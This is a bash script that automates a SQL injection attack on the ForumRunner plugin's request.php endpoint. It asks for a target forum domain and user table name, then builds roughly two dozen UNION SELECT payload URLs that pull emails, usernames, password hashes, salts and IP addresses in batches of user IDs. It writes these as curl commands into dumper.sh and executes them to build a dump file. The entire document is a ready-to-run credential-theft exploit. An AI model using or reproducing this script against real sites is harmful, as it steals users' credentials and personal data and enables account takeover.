echo "Please input Forumrunner domain with forum directory"

read domain

echo $domain > temp.txt

echo "Please input user table name"

read table

echo $table > temp2.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E0%20and%20userid%20%3C10000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt > output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E10000%20and%20userid%20%3C20000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E20000%20and%20userid%20%3C30000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E30000%20and%20userid%20%3C40000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E40000%20and%20userid%20%3C50000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E50000%20and%20userid%20%3C60000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E60000%20and%20userid%20%3C70000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E70000%20and%20userid%20%3C80000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E80000%20and%20userid%20%3C90000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E90000%20and%20userid%20%3C100000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E100000%20and%20userid%20%3C110000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E110000%20and%20userid%20%3C120000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E120000%20and%20userid%20%3C130000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E130000%20and%20userid%20%3C140000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E140000%20and%20userid%20%3C150000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E150000%20and%20userid%20%3C160000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E160000%20and%20userid%20%3C170000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E170000%20and%20userid%20%3C180000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E180000%20and%20userid%20%3C190000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E190000%20and%20userid%20%3C200000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E200000%20and%20userid%20%3C210000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E210000%20and%20userid%20%3C220000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E220000%20and%20userid%20%3C230000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -E  "s/(.*)/\\1\/forumrunner\/request.php?d=1\&cmd=get_spam_data\&postids=-1)union%20select%201,2,3,(select%20(@x)%20from%20(select%20(@x:=0x00),(select%20(0)%20from%20($table)where%20(userid%20%3E230000%20and%20userid%20%3C242000)%20and%20(0x00)%20in%20(@x:=concat(@x,0x3c62723e,email,0x3a,0x3a,0x3a,username,0x3a,0x3a,0x3a,password,0x3a,0x3a,0x3a,salt,0x3a,0x3a,0x3a,ipaddress,0x3F,0x3F,0x3F))))x),5,6,7,8,9,10--%20-/" temp.txt >> output.txt

sed -i "s/(user)/($table)/" output.txt

sed -E "s/(.*)/curl '\1' >> dump.txt/" output.txt > dumper.sh

./dumper.sh
rm temp.txt 

rm temp2.txt
